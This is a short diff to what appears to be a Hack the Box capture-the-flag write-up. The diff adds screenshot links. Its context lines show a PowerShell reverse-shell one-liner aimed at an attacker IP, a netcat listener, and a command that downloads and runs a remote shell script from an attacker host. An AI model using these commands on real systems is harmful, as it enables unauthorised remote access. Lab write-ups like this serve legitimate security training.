@@ -179,10 +179,13 @@ $client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',<port>);$strea
 ```CSS
 ▶ nc -nlvvp 4444
 ```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/34e2c57a-9b02-4433-a031-22ebb0673841)
+
+
 ```CSS
 C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24:8000/Invoke-PowerShellTcpOneLine.ps1')"
 ```
-
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ad32556d-50f5-4ce8-8e35-28b43a952815)
 
 #### winPEAS
   - Upload `winPEASx64.exe`.
